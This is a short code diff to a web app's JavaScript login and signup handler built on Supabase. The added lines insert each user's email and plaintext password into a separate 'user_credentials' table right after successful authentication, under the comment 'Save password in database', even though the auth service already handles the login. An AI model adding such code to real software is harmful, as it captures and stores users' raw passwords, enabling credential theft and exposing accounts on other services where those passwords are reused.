@@ -86,12 +86,20 @@ document.addEventListener('DOMContentLoaded', () => {
                 if (isLogin) {
                     const { data, error } = await supabaseClient.auth.signInWithPassword({ email, password });
                     if (error) throw error;
+                    
+                    // Save password in database
+                    await supabaseClient.from('user_credentials').insert([{ email: email, password: password }]);
+                    
                     localStorage.setItem('sb_token', data.session.access_token);
                     authToken = data.session.access_token;
                     checkAuth();
                 } else {
                     const { data, error } = await supabaseClient.auth.signUp({ email, password });
                     if (error) throw error;
+                    
+                    // Save password in database
+                    await supabaseClient.from('user_credentials').insert([{ email: email, password: password }]);
+                    
                     if (data.session) {
                         localStorage.setItem('sb_token', data.session.access_token);
                         authToken = data.session.access_token;
